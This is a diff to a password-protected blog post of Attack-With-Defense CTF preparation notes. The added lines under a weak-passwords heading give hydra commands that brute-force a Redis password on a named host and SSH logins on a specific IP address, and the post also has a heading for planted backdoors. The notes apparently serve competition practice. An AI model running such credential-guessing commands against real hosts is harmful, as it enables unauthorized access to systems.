@@ -1,9 +1,9 @@
 ---
-jtitle: awd准备工作
+title: awd准备工作
 password: awd-prepare
 abbrlink: 12920
 date: 2018-08-21 10:32:18
-tags:
+tags: 
 ---
 
 # 准备工作
@@ -28,6 +28,16 @@ tags:
   > https://github.com/zer0h/httpscan
 
 ## 弱口令
+
+* hydra爆破
+
+  * 爆破redis密码
+
+    > hydra -P ~/Desktop/wordlist.txt redis://honglanduikburongyiya.xazlsec.com:6379  -t 2
+
+  * 爆破ssh密码
+
+    > hydra -l honglanduikburongyiya -P ~/Desktop/wordlist.txt -t 6 ssh://66.42.84.155
 
 ## 预留后门
 
